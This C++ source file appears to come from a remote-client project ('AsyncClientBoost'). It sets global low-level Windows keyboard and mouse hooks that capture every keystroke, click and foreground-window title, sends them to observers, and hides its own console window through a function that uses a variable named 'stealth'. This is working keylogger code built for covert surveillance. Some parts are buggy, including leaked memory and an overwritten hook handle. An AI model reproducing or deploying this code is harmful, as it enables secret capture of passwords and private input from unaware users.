//
//  KeyEvents.cpp
//  AsyncClientBoost
//
//  Created by Charles Fournier on 29/10/2014.
//  Copyright (c) 2014 Charles Fournier. All rights reserved.
//

#include "KeyEvents.h"

KeyEvents *g_key;

LRESULT __stdcall HookFunction(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (wParam == WM_KEYDOWN || wParam == WM_KEYUP ||
		wParam == WM_SYSKEYUP || wParam == WM_SYSKEYDOWN)
	{
		KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*)lParam);
		Data *data = new Data(hooked, wParam);
		if (g_key->getFocus() != NULL && strcmp(g_key->getFocus(), g_key->getWindowsTitle()) != 0)
		{
			g_key->setFocus(g_key->getWindowsTitle());
			Data *data = new Data(g_key->getFocus());
			g_key->notify(data);
		}
		g_key->notify(data);
	}
	else if (wParam == WM_LBUTTONDOWN || wParam == WM_LBUTTONUP ||
			wParam == WM_RBUTTONDOWN || wParam == WM_RBUTTONUP ||
			wParam == WM_MOUSEMOVE)
	{
		MSLLHOOKSTRUCT hooked = *((MSLLHOOKSTRUCT*)lParam);
		Data *data = new Data(hooked, wParam);
		if (g_key->getFocus() != NULL && strcmp(g_key->getFocus(), g_key->getWindowsTitle()) != 0)
		{
			g_key->setFocus(g_key->getWindowsTitle());
			Data *data = new Data(g_key->getFocus());
			g_key->notify(data);
		}
		g_key->notify(data);
	}
	return CallNextHookEx(hook, nCode, wParam, lParam);
}

KeyEvents::KeyEvents()
{
	HINSTANCE instance = GetModuleHandle(NULL);
	if (!instance) {
		exit(1);
	}
	g_key = this;
	_run = false;
	_hide = false;
	hook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)HookFunction, instance, NULL);
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)HookFunction, instance, NULL);
	hideWindow();
}

KeyEvents::KeyEvents(IObserver *obs, bool hide = false)
{
	this->addObserver(obs);
	HINSTANCE instance = GetModuleHandle(NULL);
	if (!instance) {
		exit(1);
	}
	g_key = this;
	_hide = hide;
	hook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)HookFunction, instance, NULL);
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)HookFunction, instance, NULL);
	_run = false;
	_focus = this->getWindowsTitle();
	hideWindow();

}


KeyEvents::~KeyEvents()
{
	UnhookWindowsHookEx(hook);
}

void KeyEvents::stop()
{
	_run = false;
	UnhookWindowsHookEx(hook);
}

void KeyEvents::run()
{
	MSG message;
	_run = true;
	while (_run == true)
	{
		UINT_PTR timeId = SetTimer(NULL, NULL, 1000, NULL);
		GetMessage(&message, NULL, 0, 0);
		KillTimer(NULL, timeId);
	}
}

char *KeyEvents::getWindowsTitle()
{
	char *name;
	int len;
	HWND hwnd = GetForegroundWindow();
	len = GetWindowTextLength(hwnd) + 1;
	name = (char*)malloc(sizeof(char) * len);
	memset(name, 0, sizeof(char) * len);
	GetWindowTextA(hwnd, name, len);
	std::cout << "Windows Name : " << name << std::endl;
	g_key->notify(std::string(name));
	return name;
}

char *KeyEvents::getFocus() const
{
	return _focus;
}

void KeyEvents::setFocus(char *focus)
{
	_focus = focus;
}

void KeyEvents::hideWindow()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, _hide);
}